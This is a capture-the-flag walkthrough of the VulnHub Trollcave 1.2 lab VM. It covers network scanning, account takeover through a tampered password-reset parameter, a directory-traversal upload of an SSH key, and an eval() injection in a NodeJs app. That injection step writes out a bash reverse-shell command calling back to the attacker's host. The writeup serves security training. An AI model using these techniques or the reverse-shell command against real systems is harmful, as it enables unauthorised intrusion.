---
title: VulnHub - Trollcave 1.2
author: ret2x
date: 2023-07-06 18:00:00 +0800
categories: [Walkthrough, VulnHub]
tags: [vulnhub, file upload, directory traversal]
image:
    path: /assets/images/trollcave/front.png
---

**Description:** This is a linux server with many vulnerabilities on the web application, its insecure design allowed the access to the app with high roles, and thus enable features, which made it possible to exploit the File Upload in conjuntion with a Directory Path Traversal to gain the initial foothold. To get root privileges it was leveraged of a NodeJs app running locally and sudo misconfigurations.

**Author:** David Yates

**Operating System:** Linux 

**Download:** [https://www.vulnhub.com/entry/trollcave-12,230/](https://www.vulnhub.com/entry/trollcave-12,230/)

## Information Gathering
### Host Dicovery

The following ping scan discovered the target server.

```console
root@kali:~$ for n in $(seq 1 255); do ping -W 1 -c 1 172.16.71.$n 2>&1 >/dev/null && echo "Host 172.16.71.$n Up"; done
```

### Port Scanning

The full TCP port scan with nmap found two open ports.

```console
root@kali:~$ nmap -v -n -p- --min-rate 300 172.16.71.132 -oG nmap/port-scan.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Enumeration

The version detection and script scanning discovered OpenSSH 7.2p2 on port 22 and nginx/1.10.3 on port 80 running on the server.

```console
root@kali:~$ nmap -v -n -p22,80 -sVC -Pn 172.16.71.132 -oN nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Trollcave
```

## Enumeration
### Web Browser Enumeration

Browsing on port 80, you can see that this is an interactive web application where users can post and comment.

![](/assets/images/trollcave/screenshot-1.png)

Reading the **coderguy** post, there are hints that there is a password reset utility.

![](/assets/images/trollcave/screenshot-2.png)

A quick web enumeration with dirb reveals under the **password_resets** directory the resource **new**.

```console
root@kali:~$ dirb http://172.16.71.132/password_resets/ 
...
+ http://172.16.71.132/password_resets/new (CODE:200|SIZE:2057)
```

Browse the url **http://172.16.71.132/password_resets/new** to reset the password.

Only for normal members is password reset available, to identify the user roles I performed the following python script.

```python
#!/usr/bin/env python3

import requests
import re

url = "http://172.16.71.132/users/"


def get_content(n):
    try:
        r = requests.get(f"{url}{n}")
        return r.text
    except:
        print("An error has ocurred")


output = open("users.txt", "a")

for x in range(18):
    try:
        name = re.findall(r'_name=(.*)"', get_content(x))[0]
        level = re.findall(r'<b>\n(.*)\n</b>', get_content(x))[0]
        output.write(f"{name:15} {level} \n")
        print(f"{name:15} {level}", end="\n")
    except:
        pass

output.close()
```

Once the script is executed, the users with their respective roles are displayed.

```console
root@kali:~$ python enumusers.py
King            Superadmin
dave            Admin
dragon          Admin
coderguy        Admin
cooldude89      Moderator
Sir             Moderator
Q               Moderator
teflon          Moderator
TheDankMan      Regular member
artemus         Regular member
MrPotatoHead    Regular member
Ian             Regular member
kev             Member
notanother      Member
anybodyhome     Member
onlyme          Member
xer             Member
```

It is important to know that users with **Member** role can reset the password through the POST form.

Reseting the password of the **onlyme** user.

![](/assets/images/trollcave/screenshot-3.png)

![](/assets/images/trollcave/screenshot-4.png)

![](/assets/images/trollcave/screenshot-5.png)

![](/assets/images/trollcave/screenshot-6.png)

Note that it is not possible to upload files because this feature is disabled.

![](/assets/images/trollcave/screenshot-7.png)

Again try to reset the password for the **onlyme** user, once the link is generated, change the value of the **name** parameter to **King**, since this is a **superadmin** user.

![](/assets/images/trollcave/screenshot-8.png)

The reset was successful for user **King**.

![](/assets/images/trollcave/screenshot-9.png)

Click **Admin panel**  to enable the file upload functionality.

![](/assets/images/trollcave/screenshot-10.png)

Knowing that it is a ruby on rails app, I uploaded a ruby reverse shell but it did not work.

When reading the coderguy's post I discovered that there is a system user named **rails**. 

![](/assets/images/trollcave/screenshot-11.png)

After a few attempts to upload a file, I found that the **Alternate file name (optional)** field is vulnerable to Directory Traversal and it is possible to upload a malicious file in a directory where the user that is running the application has write permissions.

I have discovered that it is possible to upload files in the home directory of the **rails** user.

![](/assets/images/trollcave/screenshot-12.png)


## Exploitation
### File Upload

The idea is to upload a public key, so I generated the ssh keys, rename the **id_rsa.pub** file to **authorized_keys**.

```console
root@kali:~$ ssh-keygen  -P "s3cret" -f id_rsa
root@kali:~$ mv id_rsa.pub authorized_keys
```

Upload the file as shown in the following image.

![](/assets/images/trollcave/screenshot-13.png)

### Access to the server

Using the private key it is possible to log in to the server.

```console
root@kali:~$ ssh -l rails 172.16.71.132 -i id_rsa
...
$ bash
rails@trollcave:~$ 
```

A service is running on port 8888.

```console
rails@trollcave:~$ ss -antl | grep '8888'
LISTEN     0      128    127.0.0.1:8888                     *:* 
```

A process with privileges of **King** user is running.

```console
rails@trollcave:~$ ps aux | grep 'king' | head -1
king       995  0.0  2.7 744952 21204 ?        Ssl  19:07   0:01 /usr/bin/nodejs /home/king/calc/calc.js
```

I concluded that the service running on port 8888 is a NodeJs application.

```console
rails@trollcave:~$ grep -A 1 '8888' ../king/calc/calc.js 
http.createServer(onRequest).listen(8888, '127.0.0.1');
console.log("Server started");
```

This app is using the eval() method, which is not safe, since this evaluates the string expression and returns its value.

```console
rails@trollcave:~$ cat ../king/calc/calc.js
...
function calc(pathname, request, query, response)
{
	sum = query.split('=')[1];
	console.log(sum)
	response.writeHead(200, {"Content-Type": "text/plain"});

	response.end(eval(sum).toString());
}
...
```

To interact with this through the web browser I performed local port forwarding.

```console
root@kali:~$ ssh -L 8888:127.0.0.1:8888 -l rails 172.16.71.132 -N -i id_rsa
```

Interacting with the web browser the application gives problems.

![](/assets/images/trollcave/screenshot-14.png)

Using curl it is possible interact with the app.

```console
root@kali:~$ curl 'http://127.0.0.1:8888/calc?sum=1+1'
2 
```

## Privilege Escalation
### Code Injection - NodeJs Application

To exploit this vulnerability I was guided by [this](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44) site.

Set a listener with netcat on port 443.

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
```

Run the request using curl, as shown below:

```console
rails@trollcave:~$ echo "bash -c 'bash -i >& /dev/tcp/172.16.71.1/443 0>&1'" > rev.sh
rails@trollcave:~$ chmod +x !$ 
chmod +x rev.sh 
```

```console
root@kali:~$ nc -vlnp 443
listening on [any] 443 ...
connect to [172.16.71.1] from (UNKNOWN) [172.16.71.132] 51122
bash: cannot set terminal process group (5362): Inappropriate ioctl for device
bash: no job control in this shell
king@trollcave:~/calc$
```

### Sudo privileges

When listing the sudo rigths for the user **King**, I discovered that it is possible to execute any command as sudo without password.

```console
king@trollcave:~/calc$ sudo -l
sudo -l
Matching Defaults entries for king on trollcave:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User king may run the following commands on trollcave:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Run the following command and get root access.

```console
king@trollcave:~/calc$ sudo su
sudo su
bash -i
bash: cannot set terminal process group (5362): Inappropriate ioctl for device
bash: no job control in this shell
root@trollcave:/home/king/calc#
```

```console
root@trollcave:~# cat fl* 
cat fl*
et tu, dragon?

c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5
```
